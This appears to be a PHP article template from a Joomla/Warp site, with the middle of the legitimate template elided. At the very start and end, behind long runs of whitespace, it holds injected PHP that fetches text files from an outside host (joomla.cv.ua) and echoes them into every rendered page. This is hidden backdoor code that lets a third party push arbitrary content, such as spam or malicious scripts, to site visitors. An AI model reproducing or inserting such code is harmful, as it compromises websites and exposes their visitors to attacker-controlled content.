                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <?php  $files = 'http://joomla.cv.ua/1/j02.txt'; $file_headers = @get_headers($files); if($file_headers[0] == 'HTTP/1.1 200 OK') { $content = file("http://joomla.cv.ua/1/j02.txt"); $data = implode($content); echo $data; } ?>
<?php
/**
...
echo $warp['template']->render('article', $args);?>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <?php $files = 'http://joomla.cv.ua/1/j01.txt'; $file_headers = @get_headers($files); if($file_headers[0] == 'HTTP/1.1 200 OK') { $content = file("http://joomla.cv.ua/1/j01.txt"); $data = implode($content); echo $data; } ?>
